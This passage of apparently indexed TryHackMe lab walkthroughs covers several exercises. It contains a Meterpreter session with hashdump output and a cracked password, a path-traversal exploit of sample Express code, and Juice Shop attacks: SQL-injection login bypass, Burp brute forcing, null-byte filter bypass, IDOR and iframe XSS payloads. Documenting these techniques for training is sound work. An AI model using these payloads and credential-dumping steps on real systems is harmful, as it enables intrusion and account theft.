C:\\Windows\\System32\\svchost.exe\n 1192  748   svchost.exe         x64   0        NT AUTHORITY\\LOCAL SERVICE    C:\\Windows\\System32\\svchost.exe\n 1240  748   svchost.exe         x64   0        NT AUTHORITY\\NETWORK SERVICE  C:\\Windows\\System32\\svchost.exe\n 1292  748   svchost.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 1376  748   svchost.exe         x64   0        NT AUTHORITY\\LOCAL SERVICE    C:\\Windows\\System32\\svchost.exe\n 1408  748   svchost.exe         x64   0        NT AUTHORITY\\LOCAL SERVICE    C:\\Windows\\System32\\svchost.exe\n 1688  748   svchost.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 1788  884   CompatTelRunner.ex  x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\CompatTelRunner.\n             e                                                                exe\n 2164  668   fontdrvhost.exe     x64   0        Font Driver Host\\UMFD-0       C:\\Windows\\System32\\fontdrvhost.exe\n 2172  684   fontdrvhost.exe     x64   1        Font Driver Host\\UMFD-1       C:\\Windows\\System32\\fontdrvhost.exe\n 2204  748   spoolsv.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\spoolsv.exe\n 2264  748   svchost.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 2280  748   svchost.exe         x64   0        NT AUTHORITY\\LOCAL SERVICE    C:\\Windows\\System32\\svchost.exe\n 2332  748   amazon-ssm-agent.e  x64   0        NT AUTHORITY\\SYSTEM           C:\\Program Files\\Amazon\\SSM\\amazon-s\n             xe                                                               sm-agent.exe\n 2348  748   svchost.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\svchost.exe\n 2388  748   LiteAgent.exe       x64   0        NT AUTHORITY\\SYSTEM           C:\\Program Files\\Amazon\\XenTools\\Lit\n                                                                              eAgent.exe\n 2416  748   ismserv.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\ismserv.exe\n 2440  748   dfsrs.exe           x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\dfsrs.exe\n 2448  748   dfssvc.exe          x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\dfssvc.exe\n 2476  748   Microsoft.ActiveDi  x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\ADWS\\Microsoft.ActiveDire\n             rectory.WebService                                               ctory.WebServices.exe\n             s.exe\n 2556  748   dns.exe             x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\dns.exe\n 2872  2332  ssm-agent-worker.e  x64   0        NT AUTHORITY\\SYSTEM           C:\\Program Files\\Amazon\\SSM\\ssm-agen\n             xe                                                               t-worker.exe\n 2880  2872  conhost.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\conhost.exe\n 2956  748   vds.exe             x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\vds.exe\n 3120  3240  conhost.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\conhost.exe\n 3232  684   LogonUI.exe         x64   1        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\LogonUI.exe\n 3240  3136  powershell.exe      x86   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\SysWOW64\\WindowsPowerShel\n                                                                              l\\v1.0\\powershell.exe\n 3308  1788  conhost.exe         x64   0        NT AUTHORITY\\SYSTEM           C:\\Windows\\System32\\conhost.exe\n 3696  748   msdtc.exe           x64   0        NT AUTHORITY\\NETWORK SERVICE  C:\\Windows\\System32\\msdtc.exe\n 3876  748   svchost.exe         x64   0\n\nmeterpreter &gt; migrate 764\n[*] Migrating from 3240 to 764...\n[*] Migration completed successfully.\n\nmeterpreter &gt; getpid\nCurrent pid: 764\n\nmeterpreter &gt; hashdump\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::\nballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::\njchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::\njfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::\nlnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::\nerptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::\nACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:b0193410734347e986c59daebea2e2af:::\n</code></pre> Let's use an online rainbow table to find jchambers cleartext password. We can use something like CrackStation to do this.</p> <p><code>69596c7aa1e8daee17f8e78870e25a5c:NTLM:Trustno1</code></p> <p>Let's find where the \"secrets.txt\" file is located and display its contents.</p> <p><pre><code>meterpreter &gt; search -f secrets.txt\nFound 1 result...\n=================\n\nPath                                                            Size (bytes)  Modified (UTC)\n----                                                            ------------  --------------\nc:\\Program Files (x86)\\Windows Multimedia Platform\\secrets.txt  35            2021-07-30 01:44:27 -0600\n\nmeterpreter &gt; cat \"c:\\Program Files (x86)\\Windows Multimedia Platform\\secrets.txt\"\nMy Twitter password is KDSvbsw3849!\n</code></pre> Let's find where the \"realsecret.txt\" file is located.</p> <pre><code>meterpreter &gt; search -f realsecret.txt\nFound 1 result...\n=================\n\nPath                               Size (bytes)  Modified (UTC)\n----                               ------------  --------------\nc:\\inetpub\\wwwroot\\realsecret.txt  34            2021-07-30 02:30:24 -0600\n\nmeterpreter &gt; cat \"c:\\inetpub\\wwwroot\\realsecret.txt\"\nThe Flash is the fastest man alive\n</code></pre>"},{"location":"walkthroughs/thm/motherssecret/","title":"Mother's Secret","text":""},{"location":"walkthroughs/thm/motherssecret/#introduction","title":"Introduction","text":"<p>In this challenge, we will investigate the compromised computer system of TryHackMe's Cargo Star Ship Nostromo. We are tasked with uncovering the secrets by exploiting vulnerabilities in the web application running on the Nostromo server.</p>"},{"location":"walkthroughs/thm/motherssecret/#reconosint","title":"Recon/OSINT","text":"<p>This particular room does not require any reconnaissance as all the necessary information and codebase is provided to get us started.</p> <p>We are provided the following hints: - Emergency command override is 100375. Use it when accessing Alien Loaders. - Download the task files to learn about the server routes. - Can you guess what is <code>/api/nostromo/mother/secret.txt</code>?</p> <p>The provided task files are a set of javascript files detailing the server API routes.</p> <pre><code>//yaml.js\n\nimport express from \"express\";\nimport yaml from \"js-yaml\";\nimport fs from \"fs\";\nimport { attachWebSocket } from \"../websocket.js\";\n\nconst Router = express.Router();\n\nconst isYaml = (filename) =&gt; filename.split(\".\").pop() === \"yaml\";\n\nRouter.post(\"/\", (req, res) =&gt; {\n  let file_path = req.body.file_path;\n  const filePath = `./public/${file_path}`;\n\n  if (!isYaml(filePath)) {\n    res.status(500).json({\n      status: \"error\",\n      message: \"Not a YAML file path.\",\n    });\n    return;\n  }\n\n  fs.readFile(filePath, \"utf8\", (err, data) =&gt; {\n    if (err) {\n      res.status(500).json({\n        status: \"error\",\n        message: \"Failed to read the file.\",\n      });\n      return;\n    }\n\n    res.status(200).send(yaml.load(data));\n\n    attachWebSocket().of(\"/yaml\").emit(\"yaml\", \"YAML data has been processed.\");\n  });\n});\n\nexport default Router;\n</code></pre> <pre><code>// Nostromo.js\n\nimport express from \"express\";\nimport fs from \"fs\";\n// import { attachWebSocket } from \"../../mothers_secret_challenge/websocket.js\";\nimport { attachWebSocket } from \"../websocket.js\";\nimport { isYamlAuthenticate } from \"./yaml.js\";\nlet isNostromoAuthenticate = false;\n\nconst Router = express.Router();\n\nRouter.post(\"/nostromo\", (req, res) =&gt; {\n  let file_path = req.body.file_path;\n  const filePath = `./public/${file_path}`;\n\n  fs.readFile(filePath, \"utf8\", (err, data) =&gt; {\n    if (err) {\n      res.status(500).json({\n        status: \"error\",\n        message: \"Science Officer Eyes Only\",\n      });\n      return;\n    }\n\n    isNostromoAuthenticate = true\n    res.status(200).send(data);\n\n    attachWebSocket()\n      .of(\"/nostromo\")\n      .emit(\"nostromo\", \"Nostromo data has been processed.\");\n  });\n});\n\nRouter.post(\"/nostromo/mother\", (req, res) =&gt; {\n\n  let file_path = req.body.file_path;\n  const filePath = `./mother/${file_path}`;\n\n  if(!isNostromoAuthenticate || !isYamlAuthenticate){\n    res.status(500).json({\n      status: \"Authentication failed\",\n      message: \"Kindly visit nostromo &amp; yaml route first.\",\n    });\n    return \n  }\n\n  fs.readFile(filePath, \"utf8\", (err, data) =&gt; {\n    if (err) {\n      res.status(500).json({\n        status: \"error\",\n        message: \"Science Officer Eyes Only\",\n      });\n      return;\n    }\n\n    res.status(200).send(data);\n\n    // attachWebSocket()\n    //   .of(\"/nostromo\")\n    //   .emit(\"nostromo\", \"Nostromo data has been processed.\");\n  });\n});\n\nexport default Router;\n</code></pre>"},{"location":"walkthroughs/thm/motherssecret/#exploitation","title":"Exploitation","text":"<p>We we can view the main page by navigating to the server's IP address.</p> <p></p> <p>We notice that we currently have the current role and access permissions of <code>Crew Member</code>.</p> <p>Let's begin exploring the available endpoints on the server. The code provided in <code>yaml.js</code> is a server-side route handler using <code>Node.js</code> and <code>Express</code>. Some key points related to the code are as follows:</p> <ol> <li>The route handles a POST request to the root <code>/</code> endpoint.</li> <li>It extracts the <code>file_path</code> from the request body.</li> <li>It checks if the file has a YAML extension using the <code>isYaml</code> function.</li> <li>If the file is not a YAML file or the YAML file does not exist, it sends an 500 Internal Server Error response.</li> <li>If the file is a YAML file, it reads the content of the file asynchronously using fs.readFile.</li> <li>It parses the YAML data using the yaml.load method.</li> <li>It sends the parsed YAML data in the response.</li> <li>It emits a WebSocket event to the <code>/yaml</code> namespace indicating that YAML data has been processed.</li> </ol> <p>Let's see this in action in BurpSuite. Let's begin by issuing a POST request with a random YAML file name to the <code>/yaml</code> endpoint. We begin by capturing a request to the <code>/yaml</code> endpoint and changing the request method to POST in BurpSuite. As we will be passing data along in JSON format, we also need to change the <code>Content-Type</code> in the HTTP request header to <code>application/json</code>.</p> <p></p> <p>Looking at the response we get back from the server, we find that we received a 500 Internal Server Error. This is because the file we requested is not found on the server. One of the hints provided refers to an emergency command override code <code>100375</code>. Perhaps this is a reference to the file we are looking for.</p> <p></p> <p>Looks like we were successfully able to read the contents of the <code>100375.yaml</code> file. The contents of the file point to a second endpoint located at <code>api/nostromo</code>. Let's have a look at the code for <code>nostromo.js</code>. The code has the following key points:</p> <ol> <li>Handles a POST request to <code>/nostromo</code>.</li> <li>Reads the content of a text file specified by the <code>file_path</code> from the request body.</li> <li>If successful, sets <code>isNostromoAuthenticate</code> to <code>true</code>.</li> <li>Sends the file data in the response.</li> <li>Emits a WebSocket event to the <code>/nostromo</code> namespace.</li> </ol> <p>Based on the contents of the previous response from the <code>/yaml</code> endpoint, let's try requesting the <code>0rd3r937.txt</code> file.</p> <p></p> <p>The response provides us with the hidden flag in the Nostromo route: <code>Flag{X3n0M0Rph}</code></p> <p>Since we were successful in reading the contents of the file, the code sets the <code>isNostromoAuthenticate</code> to <code>true</code>; in essence, authenticating us as a Science Officer rather than a Crew Member. If we switch back to the server website in our browser, we can see that we have been authenticated as <code>Ash</code> as evident from the value indicated under <code>Role</code>. Switching to the <code>Flag</code> tab, we can extract the flag for the Science Officer role: <code>THM_FLAG{0RD3R_937}</code></p> <p></p> <p>Now we can extract the contents of <code>secret.txt</code> located at <code>/api/nostromo/mother</code> in a similar manner.</p> <p></p> <p>The contents of <code>secret.txt</code> point to the location where Mother's Secret is located at. Let's see if the endpoint is vulnerable to a directory traversal attack (LFI). </p> <p></p> <p>Flag: <code>Flag{Ensure_return_of_organism_meow_meow!}</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/","title":"OWASP Juice Shop","text":""},{"location":"walkthroughs/thm/owaspjuiceshop/#introduction","title":"Introduction","text":"<p>This room looks at OWASP's Top 10 Vulnerabilities in web applications. The intent of this room is not to cover every topic but the following topics will be covered.   - Injection   - Broken Authentication   - Sensitive Data Exposure   - Broken Access Control   - Cross-Site Scripting (XSS)</p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#task-1-open-for-business","title":"Task 1 - Open for Business!","text":"<p>Nothing specific to do in this task other than starting the machine and ensuring Burp Suite is properly configured.</p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#task-2-lets-go-on-an-adventure","title":"Task 2 - Let's Go on an Adventure!","text":"<p>Before getting into vulnerabilities in the web application, let's have a look around the application. This is called walking through the application which is a form of reconnaissance. </p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-1","title":"Question 1:","text":"<p>The reviews on the product cards show user emails. The admin email address (<code>admin@juice-sh.op</code>)can be found by checking the review section on the Apple Juice (1000ml) product card.</p> <p></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-2","title":"Question 2:","text":"<p>The search parameter (<code>q</code>) can be found by clicking on the magnifying glass to expand the search bar and searching some text.</p> <p></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-3","title":"Question 3:","text":"<p>To find the show referenced by Jim, we need to look at the review he left for the Green Smoothie product.</p> <p></p> <p>Replicator is a reference to Star Trek.</p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#task-3-inject-the-juice","title":"Task 3 - Inject the Juice","text":"<p>This task will be focusing on injecting vulnerabilities in the the web application. Injection vulnerabilities are extremely dangerous and can lead to downtime and/or loss of data. </p> <p>First step to injection is identifying injection points within the web application. Most injection points will typically return some sort of an error. Although there are many types of injection attacks, the following are the most common.   - SQL Injection - SQL injection attacks requires an attacker to enter a malicious or malformed SQL query to either tamper with or retrieve data from a database. SQL injection can also be used to log into accounts if inputs are not properly sanitized and parameterized queries are not used.   - Command Injection - Command injection occurs when an a web application takes input or user-controlled data and runs them as a system command. An attacker may tamper with this data to execute their own system commands. This can be seen in applications that perform misconfigured ping tests.   - Email Injection - Email injection is a security vulnerability that allows malicious users to send email messages without prior authorization by the email server. These occur when the attacker adds extra data to fields which are not interpreted by the server correctly.</p> <p>The exercises in this task will utilize SQL injection techniques.</p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-1-log-into-the-administrator-account","title":"Question 1: Log into the administrator account!","text":"<p>To begin, let's enable Intercept in Burp Suite and ensure that our browser is configured with the correct proxy. Capture the request made by the login page with random data in the email and password field.</p> <p></p> <p>Let's modify the email data with the malicious SQL query: <code>' or 1=1;--</code></p> <p>Let's assume the backend SQL query looks like something like the following:</p> <p><pre><code>SELECT * FROM users WHERE username = '$username' AND password = '$password';\n</code></pre> The malicious entry will result in a modified query as follows:</p> <p><pre><code>SELECT * FROM users WHERE username = '' OR 1=1;-- AND password = '$password';\n</code></pre> Since the statement <code>1=1</code> is always true, the whole statement becomes true. Note that the password portion of the query is commented out due to <code>--</code> which is denotes comment in several SQL syntaxes. As a result, the authentication check is bypassed and the server logs us into <code>user id 0</code>, which happens to be the administrator account.</p> <p>This query is always true and if proper measures are not taken in the backend will allow us to bypass authentication completely.</p> <p></p> <p>Forward the request in Burp Suite to exploit the vulnerability.</p> <p></p> <p></p> <p>Retrieved Flag: <code>32a5e0f21372bcc1000a6088b93b458e41f0e02a</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-2-log-into-the-bender-account","title":"Question 2: Log into the Bender Account","text":"<p>In this challenge, we are asked to log into Bender's account. To facilitate this, we are provided with Bender's email address: <code>bender@juice-sh.op</code></p> <p>We can achieve this by following the similar technique as the previous challenge but instead using the payload <code>' or 1=1;--</code> which logs us into admin's account (User ID 0), we will instead use the payload <code>bender@juice-sh.op';--</code>. Since we know that email address exists, we do not need to provide an always true condition since our payload will result in a true condition regardless. Because we know that the login form is susceptible to SQLi form the previous challenge, our payload will allow us to bypass authentication check for Bender's account and log us in.</p> <p></p> <p></p> <p></p> <p>Retrieved Flag: <code>fb364762a3c102b2db932069c0e6b78e738d4066</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#task-4-who-broke-my-lock","title":"Task 4 - Who Broke My Lock?!","text":"<p>In this task, we will be exploiting authentication through the following flaws:   - Weak passwords in high privileged accounts   - Forgotten password pages</p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-1-bruteforce-the-administrator-accounts-password","title":"Question 1 - Bruteforce the Administrator Account's Password!","text":"<p>In the previous task, we logged into the administrator account without knowing the password. In this challenge, we are asked to determine the administrator account's password. Let's brute-force the password. We can accomplish this by using the Intrude feature of Burp Suite.</p> <p>With the browser configured with Burp proxy, let's capture a login request for the administrator account using Burp Suite Intercept.</p> <p></p> <p>Right-click and send to Intruder. Clear all payload markers and delete the data in the password field. Add two payload makers in the password data field as indicated below.</p> <p></p> <p>Under the <code>Payloads</code> tab, ensure that <code>Simple List</code> is selected as a payload type. Under the <code>Payload Options</code> load the <code>best1050.txt</code> list from Seclists (located at: /usr/share/seclists/Passwords/Common-Credentials/best1050.txt).</p> <p>When ready, click <code>Start attack</code> to begin brute-forcing the password. Failed attempts at the login will return a <code>401 Unauthorized</code> status while a successful request will return a <code>200 OK</code> status.</p> <p></p> <p>Credentials Found: <code>admin@juice-sh.op:admin123</code></p> <p>Let's use the above credentials to log into the administrator's account.</p> <p></p> <p></p> <p></p> <p>Retrieved Flag: <code>c2110d06dc6f81c67cd8099ff0ba601241f1ac0e</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-2-reset-jims-password","title":"Question 2 - Reset Jim's Password!","text":"<p>In this challenge, we will be exploiting the password reset mechanism present in many web applications. This method of exploitation often requires Social Engineering and OSINT to fool the application into thinking that an attacker is the legitimate user requesting a password reset.</p> <p>Let's click on the <code>Forgot your password?</code> link on the Login form. Entering Jim's email into the Email field yields a Security Question: <code>Your eldest siblings middle name?</code></p> <p>From Task 2, we determined that Jim has an affinity to Star Trek. This might be a good start. In the original Star Trek series, the James Tiberius Kirk, played by William Shatner, was often called Jim by his crew members. Searching for Captain Kirk's family tree reveals that he had an older brother named <code>George Samuel Kirk</code>. </p> <p>Let's use <code>Samuel</code> as the answer to the security question and <code>pass123</code> as the new password.</p> <p></p> <p></p> <p></p> <p>Retrieved Flag: <code>094fbc9b48e525150ba97d05b942bbf114987257</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#task-5-ah-dont-look","title":"Task 5 - AH! Don't Look!","text":"<p>Developers must ensure that their web application stores and transmits data safely and securely. If data protection is not applied consistently across the web application, it can make sensitive resources accessible to the public leading to sensitive data exposure.</p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#access-the-confidential-document","title":"Access the Confidential Document","text":"<p>Under the <code>About Us</code> section of the web application, we notice that the developer has linked a file containing the company's terms and conditions (<code>http://$MACHINE_IP/ftp/legal.md</code>).</p> <p>Playing around with the URL, we notice that the developer has violated the principle of least privilege or deny by default. As a result, we are able to bypass access control checks by modifying the URL to gain unauthorized access to sensitive information.</p> <p>We can view the contents of the <code>ftp</code> directory by navigating to <code>http://$MACHINE_IP/ftp</code>.</p> <p></p> <p>Let's download the the <code>acquisitions.md</code> document and navigate back to the homepage to retrieve the flag.</p> <p></p> <p>Retrieved Flag: <code>edf9281222395a1c5fee9b89e32175f1ccf50c5b</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-2-log-into-mc-safesearchs-account","title":"Question 2 - Log into MC SafeSearch's Account!","text":"<p>In this challenge, we are asked to log into MC SafeSearch's account. We are provided a link to a video and are told that the the password is mentioned somewhere in the video. We are provided the email address: <code>mc.safesearch@juice-shop.op</code></p> <p>Video Link: <code>https://www.youtube.com/watch?v=v59CX2DiX0Y&amp;t=116s</code></p> <p>In one of the verses, MC SafeSearch states that his password is the name of his dog <code>Mr. Noodles</code> with some of the vowels replaced with zeroes. The most probable password then is <code>Mr. N00dles</code>.</p> <p>Let's try and login with credentials: <code>mc.safesearch@juice-sh.op:Mr. N00dles</code></p> <p></p> <p></p> <p>Retrieved Flag: <code>66bdcffad9e698fd534003fbb3cc7e2b7b55d7f0</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-3-download-the-backup-file","title":"Question 3 - Download the Backup File!","text":"<p>In this challenge, we are asked to download the <code>package.json.bak</code> file. However, when attempting to download the file, we get a <code>403 Error: Only .md and .pdf files are allowed!</code>.</p> <p></p> <p>We can bypass this restriction by using a character bypass technique called Poison Null Byte (see also Embedding Null Code). Poison Null Byte bypass relies on injecting a null byte character (<code>%00</code>, <code>\\00</code>) to bypass file access restrictions. The Null Byte is actually a NULL terminator which when placed in a string at a certain byte tells the server to terminate at that point thereby nulling the rest of the string.</p> <p>Note that when injecting a Null Byte into a URL, the Null Byte will need to be encoded into a URL encoded format (<code>%00 = %2500</code>, <code>\\00 = %5C00</code>).</p> <p>Let's modify the URL string as follows: <code>http://$Machine_IP/ftp/package.json.bak%2500.pdf</code></p> <p>When the modified request is passed to the server, the server will terminate the string before the injected Null Byte and ignore everything afterwards; thus allowing us to bypass the file extension filter and download the desired file.</p> <p></p> <p></p> <p>Retrieved Flag: <code>bfc1e6b4a16579e85e06fee4c36ff8c02fb13795</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#task-6-whos-flying-this-thing","title":"Task 6 - Who's Flying This Thing?","text":"<p>Modern web applications allow for multiple users to have access to different pages through access control. When Broken Access Control vulnerabilities are found, they are typically categorized in one of the two following types:   - Horizontal Privilege Escalation - Occurs when a user can perform an action or access data from another user with the same level of permissions.   - Vertical Privilege Escalation - Occurs when a user can perform an action or access data of another user with a higher level of permissions.</p> <p></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-1-access-the-administrator-page","title":"Question 1 - Access the Administrator Page!","text":"<p>In this challenge, we are tasked to find the administrator page for the Juice Shop. We can try using Feroxbuster or Gobuster however the challenge hints that the path to the administrator page is somewhere in the source.</p> <p>Let's open up debugger and look at all the sources the page is loading. Looking through <code>main-es2015.js</code> and searching for the term <code>admin</code> we find what looks to be a path to an admin portal.</p> <p></p> <p>Trying to access the page at <code>http://Machine_IP/#/administration</code> we receive a <code>403 Forbidden</code> error before being redirected back to the main page. It is possible that the page is only accessible to individuals with appropriate permissions. Let's try accessing the page when logged in as the administrator.</p> <p>Use the admin credentials found previously (<code>admin@juice-sh.op:admin123</code>) to log in. Access the admin portal via the link above once logged in to solve the challenge.</p> <p></p> <p></p> <p>Retrieved Flag: <code>946a799363226a24822008503f5d1324536629a0</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-2-view-another-users-shopping-basket","title":"Question 2 - View Another User's Shopping Basket!","text":"<p>In this challenge, we are tasked with viewing another user's basket while not signed in as the target user.</p> <p>Open Burp Suite and configure the web browser to Burp Proxy. Enable Intercept and while logged in as another user (for example as the administrator from the previous challenge) click on the <code>Your Basket</code> and capture the request (you may need to forward a few requests until you see the following request).</p> <p></p> <p>Looks like the application makes a GET request to retrieve a user's basket. We can modify the request as shown below to view another user's basket.</p> <p></p> <p>Forward the modified request to solve the challenge.</p> <p></p> <p></p> <p>Retrieved Flag: <code>41b997a36cc33fbe4f0ba018474e19ae5ce52121</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-3-remove-all-5-star-reviews","title":"Question 3 - Remove All 5-Star Reviews!","text":"<p>In this challenge, we are asked to remove all 5-Star reviews left by the users of the Juice Shop. To do this, we need to revisit the <code>administration</code> page and click on the bin icon next to the reviews to remove them.</p> <p></p> <p></p> <p>Retrieved Flag: <code>50c97bcce0b895e446d61c83a21df371ac2266ef</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#task-7-where-did-that-come-from","title":"Task 7 - Where Did That Come From?","text":"<p>In this task, we will be looking at Cross-site scripting (or XSS). XSS vulnerability allows an attacker to run javascript in web applications. Other than SQLi, XSS vulnerabilities are some of the most common bugs with web applications.</p> <p>There are three major types of XSS attacks:</p> <ul> <li>DOM (Special) - DOM XSS (Document Object Model-based Cross-site Scripting) uses the HTML environment to execute malicious javascript. These type of attacks commonly use the ` HTML tags.</li> <li>Persistent (Server-side) - Persistent XSS is javascript that is run when the server loads the page containing it. These can occur when the server does not sanitize the user data when it is uploaded to a page. These are commonly found on blog posts and message boards.</li> <li>Reflected (Client-side) - Reflected XSS is javascript that is run on the client-side end of the web application. These are most commonly found when the server doesn't sanitize search data.</li> </ul>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-1-perform-a-dom-xss","title":"Question 1 - Perform a DOM XSS!","text":"<p>In this challenge, we are asked to perform a DOM XSS attack. As per the requirements, we will be using iframe element with javascript alert tag: </p> <pre><code>&lt;iframe src=\"javascript:alert(`XSS`)\"&gt;\n</code></pre> <p>Note that the iframe being used is a common HTML element found in many web applications though there are other variants which also produce the same result. This type of XSS is also called Cross-Frame Scripting (XFS) and is one of the most common forms of detecting XSS within web applications. Web applications that allow the user to modify the iframe or other DOM elements will most likely be vulnerable to XSS.</p> <p></p> <p></p> <p></p> <p>Retrieved Flag: <code>9aaf4bbea5c30d00a1f5bbcfce4db6d4b0efe0bf</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-2-perform-a-persistent-xss","title":"Question 2 - Perform a Persistent XSS!","text":"<p>In this challenge, we are asked to perform a Persistent XSS attack. To do this, we are first asked to log into the admin account and navigate to the <code>Last Login IP</code> page for this attack. THis page logs the last login IP address. To continue, we will need to use Burp Suite.</p> <p>Let's capture a logout request so that our IP address can&lt;&gt; be logged. Open the Inspector panel and expand the Request Headers section. Add the following new header: </p> <pre><code>True-Client-IP:&lt;iframe src=\"javascript:alert(`XSS`)\"&gt;\n</code></pre> <p>When signing back into the admin account and navigating to the <code>Last Login IP</code> page, the XSS alert is displayed.</p> <p></p> <p></p> <p></p> <p>Retrieved Flag: <code>149aa8ce13d7a4a8a931472308e269c94dc5f156</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#question-3-perform-a-reflected-xss","title":"Question 3 - Perform a Reflected XSS!","text":"<p>In this challenge, we are asked to perform a reflected XSS. To do this, let's navigate to the <code>Order History</code> page in the admin account. Here we see a Truck icon which when clicked-on will bring us to the track result page. On this page, we are presented with an ID paired with an order.</p> <p></p> <p>Substituting the ID <code>5267-cb88c5750e5e4b5f</code> with:</p> <p><pre><code>&lt;iframe src=\"javascript:alert(`XSS`)\"&gt;\n</code></pre> Submitting the request will trigger the XSS. You may need to hard refresh the page for the pop-up to occur.</p> <p></p> <p></p> <p>Retrieved Flag: <code>23cefee1527bde039295b2616eeb29e1edc660a0</code></p>"},{"location":"walkthroughs/thm/owaspjuiceshop/#task-8-exploration","title":"Task 8 - Exploration","text":"<p>Navigating to the <code>http://Machine_IP/#/score-board/</code> page we can retrieve the final flag required to complete the room. However, there are many other vulnerabilities on the web application which we can explore and attempt to exploit at this point or in the future.</p> <p></p> <p>Retrieved Flag: <code>7efd3174f9dd5baa03a7882027f2824d2f72d86e</code></p>"},{"location":"walkthroughs/thm/owasptop10_2021/","title":"OWASP Top 10 - 2021","text":""},{"location":"walkthroughs/thm/owasptop10_2021/#task-1-introduction","title":"Task 1 - Introduction","text":"<p>This room covers topics related to OWASP Top 10 vulnerabilities (updated 2021). The material covered includes details on the vulnerabilities, how they occur, and methodologies to exploit them. Specific topics covered are as follows: 1. Broken Access Control 2. Cryptographic Failures 3. Injection 4. Insecure Design 5. Security Misconfiguration 6. Vulnerable and Outdated Components 7. Identification and Authentication Failures 8. Software and Data Integrity Failures 9. Security Logging &amp; Monitoring Failures 10. Server-Side Request Forgery (SSRF)</p> <p>Additional information regarding OWASP Top 10 project can be found at OWASP Top 10.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-2-accessing-machines","title":"Task 2 - Accessing Machines","text":"<p>This task contains instructions on accessing target vulnerable machines required for the remainder of the tasks.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-3-broken-access-control","title":"Task 3 - Broken Access Control","text":"<p>Access control is intended to enforce policy such that users cannot act outside their intended permissions. Broken access control allows attackers to bypass authorization, allowing them to view, modify, or delete sensitive data or perform tasks which should be restricted to them.</p> <p>Common access control vulnerabilities include: - Violation of the principle of least privilege or deny by default. Access should only be granted for particular capabilities, roles, or users. - Bypass of access control checks and measures by modifying the URL (parameter tampering or force browsing) or HTML page, internal application state, or by modifying API requests. - Permitting viewing or editing of other users' account by providing its unique identifier (IDOR). - Accessing APIs with missing access controls for POST, PUT and DELETE. - Allow low-privileged user to act as admin or higher privileged user without being logged in (privilege escalation). - Metadata manipulation such as replaying or tampering with JSON Web Tokens (JWT). - Force browsing to authenticated pages as an unauthenticated user or to privileged pages as a standard user.</p> <p>The following are several methods which could be employed to prevent vulnerabilities arising from broken access control: - Deny resources by default. - Implement access control mechanisms once. These mechanisms should be reused throughout the application. - Minimize Cross-Origin Resource Sharing (CORS) usage. - Enforce record ownership rather than accepting that the user can create, read, update, or delete any record. - Enforce unique application business limit requirements via domain models. - Disable web server directory listing and ensure file metadata and backup files are not present within web root. - Log access control failures and alert admins when appropriate. - Rate limit API and controller access to minimize harm from automated attacks. - Stateful session identifiers should be invalidated on the server after logout. For example, JWT should be short-lived to minimize the attack window. If longer-lived JWT is required, follow the OAUTH standards to revoke access.</p>"},{"location":"walkthroughs/thm/owasptop10_2021/#task-4-broken-access-control-idor-challenge","title":"Task 4 - Broken Access Control (IDOR Challenge)","text":"<p>Insecure Direct Object Reference (IDOR) is a type of an access control vulnerability that allows a user to access resources they wouldn't normally be able to see via the use of a unique identifier without authorization checks.</p> <p>These types of vulnerabilities typically occur when a developer exposes a direct object reference (ie: a unique identifier) that is associated with a specific resource or object within the server.</p> <p>Let's look at a simple example. The task 